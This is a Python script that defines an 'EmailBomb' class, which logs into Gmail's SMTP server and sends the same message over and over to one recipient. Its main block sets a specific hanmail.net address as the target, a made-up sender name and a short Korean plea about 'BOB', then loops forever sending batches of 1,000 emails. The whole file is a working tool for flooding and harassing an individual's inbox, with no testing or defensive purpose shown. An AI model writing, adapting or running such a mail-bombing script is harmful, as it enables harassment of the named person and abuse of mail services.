# -*- coding: utf-8 -*-

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib, threading

ID = "ID"
PW = "PW"

class EmailBomb(object):
    def __init__(self, id, pw, *,
                    charset="utf-8",
                    server="smtp.gmail.com",
                    port=465):
        self._id = id
        self._pw = pw
        self._charset = charset
        self._server = server
        self._port = port
    
    def set_content(self, title, content):
        self._title = title
        self._content = content
    
    def set_my_name(self, name):
        self._name = name
    
    def set_target(self, target):
        self._target = target

    def bomb(self, *, _amount=1, _msg=None):
        msg = MIMEMultipart()

        msg["Subject"] = self._title
        msg["From"] = self._name
        msg["To"] = self._target
        
        txt = MIMEText(_text=self._content, _charset=self._charset)
        msg.attach(txt)

        msg_str = msg.as_string()
        
        s = smtplib.SMTP_SSL(self._server, self._port)
        s.login(self._id, self._pw)

        for i in range(_amount):
            s.sendmail(self._id, self._target, msg_str)

            if _msg is not None:
                print(_msg.format(i + 1))
        
        s.close()

if __name__ == "__main__":
    bomb = EmailBomb(ID, PW)

    bomb.set_my_name("BOBGAGOSIPDA")
    bomb.set_target("skyjjw79@hanmail.net")
    bomb.set_content("BOBGAGOSIPDA", "BOB 보내주세ㅛㅇ ㅠㅠ")

    while True:
        bomb.bomb(_amount=1000, _msg="{} 번째 전송 완료")